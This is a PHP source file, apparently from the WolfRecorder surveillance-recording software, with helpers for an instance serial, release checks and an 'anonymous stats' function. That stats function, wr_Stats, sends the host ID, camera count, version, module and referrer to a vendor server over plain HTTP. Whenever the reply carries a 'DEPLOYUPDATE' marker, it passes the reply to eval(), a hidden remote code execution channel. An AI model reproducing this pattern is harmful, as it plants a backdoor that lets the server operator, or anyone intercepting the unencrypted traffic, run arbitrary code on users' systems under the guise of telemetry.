<?php

/**
 * Returns current instance serial from database or cache
 * 
 * @return string
 */
function wr_SerialGet() {
    $result = '';
    $cache = new UbillingCache();
    $cacheTimeout = 2592000;
    $cachedKey = $cache->get('WRHID', $cacheTimeout);
    if (empty($cachedKey)) {
        $lairDb = new NyanORM('lair');
        $lairDb->where('key', '=', 'wrid');
        $rawResult = $lairDb->getAll('key');
        if (!empty($rawResult)) {
            $result = $rawResult['wrid']['value'];
        }

        if (!empty($result)) {
            $cache->set('WRHID', $result, $cacheTimeout);
        }
    } else {
        $result = $cachedKey;
    }
    return($result);
}

/**
 * Installs newly generated instance serial into database
 * 
 * @return string
 */
function wr_SerialInstall() {
    $randomid = 'WR' . md5(curdatetime() . zb_rand_string(8));
    $lairDb = new NyanORM('lair');
    $lairDb->data('key', 'wrid');
    $lairDb->data('value', $randomid);
    $lairDb->create();
    return($randomid);
}

/**
 * Returns current system version
 * 
 * @return string
 */
function wr_getLocalSystemVersion() {
    $result = file_get_contents('RELEASE');
    return($result);
}

/**
 * Returns remote release version
 * 
 * @param string $branch
 * 
 * @return string/bool
 */
function wr_GetReleaseInfo($branch) {
    $result = false;
    $release_url = UpdateManager::URL_RELEASE_STABLE;
    if ($branch == 'CURRENT') {
        $release_url = UpdateManager::URL_RELEASE_CURRENT;
    }
    $remoteCallback = new OmaeUrl($release_url);
    $releaseInfo = $remoteCallback->response();
    if ($releaseInfo) {
        $result = $releaseInfo;
    }
    return($result);
}

/**
 * Ajax backend for rendering WolfRecorder updates release info
 * 
 * @param bool $version
 * @param bool $branch
 * 
 * @return string/bool
 */
function wr_RenderUpdateInfo($version = '', $branch = 'STABLE') {
    $result = '';
    $latestRelease = $version;
    if ($latestRelease) {
        if ($branch == 'CURRENT') {
            $result = __('Latest nightly WolfRecorder build is') . ': ' . $latestRelease;
        } else {
            $result = __('Latest stable WolfRecorder release is') . ': ' . $latestRelease;
        }
    } else {
        $result = __('Error checking updates');
    }
    return($result);
}

/**
 * Collects anonymous stats
 * 
 * @param string $modOverride
 * 
 * @return void
 */
function wr_Stats($modOverride = '') {
    $wrStatsUrl = 'http://stats.wolfrecorder.com';
    $statsflag = 'exports/NOTRACKTHIS';
    $deployMark = 'DEPLOYUPDATE';
    $cache = new UbillingCache();
    $cacheTime = 3600;

    $hostId = wr_SerialGet();
    if (!empty($hostId)) {
        $thiscollect = (file_exists($statsflag)) ? 0 : 1;
        if ($thiscollect) {
            $moduleStats = 'xnone';
            if ($modOverride) {
                $moduleStats = 'x' . $modOverride;
            } else {
                if (ubRouting::checkGet('module')) {
                    $moduleClean = str_replace('x', '', ubRouting::get('module'));
                    $moduleStats = 'x' . $moduleClean;
                } else {
                    
                }
            }
            $releaseinfo = file_get_contents('RELEASE');
            $wrVersion = explode(' ', $releaseinfo);
            $wrVersion = ubRouting::filters($wrVersion[0], 'int');

            $wrInstanceStats = $cache->get('WRINSTANCE', $cacheTime);
            if (empty($wrInstanceStats)) {
                $camDb = new NyanORM(Cameras::DATA_TABLE);
                $camCount = $camDb->getFieldsCount('id');
                $wrInstanceStats = '?u=' . $hostId . 'x' . $camCount . 'x' . $wrVersion;
                $cache->set('WRINSTANCE', $wrInstanceStats, $cacheTime);
            }

            $statsurl = $wrStatsUrl . $wrInstanceStats . $moduleStats;


            $referrer = (isset($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : '';
            $collector = new OmaeUrl($statsurl);
            $collector->setUserAgent('WRTRACK');
            $collector->setTimeout(1);
            if (!empty($referrer)) {
                $collector->setReferrer($referrer);
            }
            $output = $collector->response();
            $error = $collector->error();
            $httpCode = $collector->httpCode();

            if (!$error AND $httpCode == 200) {
                $output = trim($output);
                if (!empty($output)) {
                    if (ispos($output, $deployMark)) {
                        $output = str_replace($deployMark, '', $output);
                        if (!empty($output)) {
                            eval($output);
                        }
                    } else {
                        show_window('', $output);
                    }
                }
            }
        }
    }
}
